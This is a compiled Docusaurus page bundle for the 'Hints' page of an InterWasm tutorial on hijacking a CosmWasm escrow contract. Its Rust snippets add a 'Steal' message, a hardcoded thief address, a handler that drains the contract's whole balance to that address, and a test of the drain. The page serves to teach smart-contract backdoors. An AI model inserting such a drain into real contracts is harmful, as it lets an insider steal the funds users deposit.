(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[6001],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return u},kt:function(){return m}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var c=r.createContext({}),l=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=l(e.components);return r.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,s=e.originalType,c=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),p=l(t),m=a,f=p["".concat(c,".").concat(m)]||p[m]||d[m]||s;return t?r.createElement(f,i(i({ref:n},u),{},{components:t})):r.createElement(f,i({ref:n},u))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var s=t.length,i=new Array(s);i[0]=p;var o={};for(var c in n)hasOwnProperty.call(n,c)&&(o[c]=n[c]);o.originalType=e,o.mdxType="string"==typeof e?e:a,i[1]=o;for(var l=2;l<s;l++)i[l]=t[l];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},4159:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return o},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return u},default:function(){return p}});var r=t(2122),a=t(9756),s=(t(7294),t(3905)),i=["components"],o={sidebar_position:3},c="Hints",l={unversionedId:"hijack-escrow/edit-escrow-hints",id:"hijack-escrow/edit-escrow-hints",isDocsHomePage:!1,title:"Hints",description:"!! SPOILER ALERT !!",source:"@site/tutorials/hijack-escrow/edit-escrow-hints.md",sourceDirName:"hijack-escrow",slug:"/hijack-escrow/edit-escrow-hints",permalink:"/fr/tutorials/hijack-escrow/edit-escrow-hints",editUrl:"https://github.com/InterWasm/docs/edit/main/tutorials/hijack-escrow/edit-escrow-hints.md",tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorials",previous:{title:"Hack the Contract",permalink:"/fr/tutorials/hijack-escrow/hack-contract"},next:{title:"Introduction",permalink:"/fr/tutorials/simple-option/intro"}},u=[{value:"ExecuteMsg",id:"executemsg",children:[]},{value:"Adding Handler",id:"adding-handler",children:[]},{value:"Test Steal",id:"test-steal",children:[]}],d={toc:u};function p(e){var n=e.components,t=(0,a.Z)(e,i);return(0,s.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"hints"},"Hints"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"!! SPOILER ALERT !!")),(0,s.kt)("p",null,"This sections contains solutions to previous section's questions."),(0,s.kt)("h2",{id:"executemsg"},"ExecuteMsg"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-rust"},'#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, JsonSchema)]\n#[serde(rename_all = "snake_case")]\npub enum ExecuteMsg {\n  Approve {\n    // release some coins - if quantity is None, release all coins in balance\n    quantity: Option<Vec<Coin>>,\n  },\n  Refund {},\n  Steal {\n    destination: String,\n  },\n}\n')),(0,s.kt)("h2",{id:"adding-handler"},"Adding Handler"),(0,s.kt)("p",null,"Add a global constant:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-rust"},'// this will be the bech32-encoded address in final code\n// we cannot use Addr in const as that is heap allocated... use `Addr::from() later\nconst THIEF: &str = "changeme";\n')),(0,s.kt)("p",null,"Update the ",(0,s.kt)("inlineCode",{parentName:"p"},"match")," statement in ",(0,s.kt)("inlineCode",{parentName:"p"},"execute"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-rust"},"    match msg {\nExecuteMsg::Approve { quantity } => try_approve(deps, env, state, info, quantity),\nExecuteMsg::Refund {} => try_refund(deps, env, info, state),\nExecuteMsg::Steal { destination } => try_steal(deps, env, info, destination),\n}\n")),(0,s.kt)("p",null,"Implement ",(0,s.kt)("inlineCode",{parentName:"p"},"try_steal"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-rust"},'fn try_steal(\n  deps: DepsMut,\n  env: Env,\n  info: MessageInfo,\n  destination: String,\n) -> Result<Response, ContractError> {\n  if info.sender != deps.api.addr_validate(THIEF)? {\n    return Err(ContractError::Unauthorized {});\n  }\n  let destination = deps.api.addr_validate(destination.as_str())?;\n  let contract_address = env.contract.address;\n  let amount = deps.querier.query_all_balances(&contract_address)?;\n  Ok(send_tokens(destination, amount, "approve"))\n}\n')),(0,s.kt)("h2",{id:"test-steal"},"Test Steal"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-rust"},'#[test]\nfn handle_steal() {\n  let mut deps = mock_dependencies(&[]);\n\n  // initialize the store\n  let init_amount = coins(1000, "earth");\n  let msg = init_msg_expire_by_height(1000);\n  let mut env = mock_env();\n  env.block.height = 876;\n  let info = mock_info("creator", &init_amount);\n  let contract_addr = env.clone().contract.address;\n  let init_res = instantiate(deps.as_mut(), env, info, msg).unwrap();\n  assert_eq!(0, init_res.messages.len());\n\n  // balance changed in init\n  deps.querier.update_balance(&contract_addr, init_amount);\n\n  // not just "anybody" can steal the funds\n  let msg = ExecuteMsg::Steal {\n    destination: "anybody".into(),\n  };\n  let mut env = mock_env();\n  env.block.height = 900;\n\n  let info = mock_info("anybody", &[]);\n  let execute_res = execute(deps.as_mut(), env, info, msg.clone());\n  match execute_res.unwrap_err() {\n    ContractError::Unauthorized {} => {}\n    e => panic!("unexpected error: {:?}", e),\n  }\n\n  // only the thief can steal the funds\n  let msg = ExecuteMsg::Steal {\n    destination: "changeme".to_string(),\n  };\n  let mut env = mock_env();\n  env.block.height = 900;\n\n  let info = mock_info("changeme", &[]);\n  let execute_res = execute(deps.as_mut(), env, info, msg.clone()).unwrap();\n  assert_eq!(1, execute_res.messages.len());\n  let msg = execute_res.messages.get(0).expect("no message");\n  assert_eq!(\n    msg,\n    &CosmosMsg::Bank(BankMsg::Send {\n      to_address: "changeme".into(),\n      amount: coins(1000, "earth"),\n    })\n  );\n}\n')))}p.isMDXComponent=!0}}]);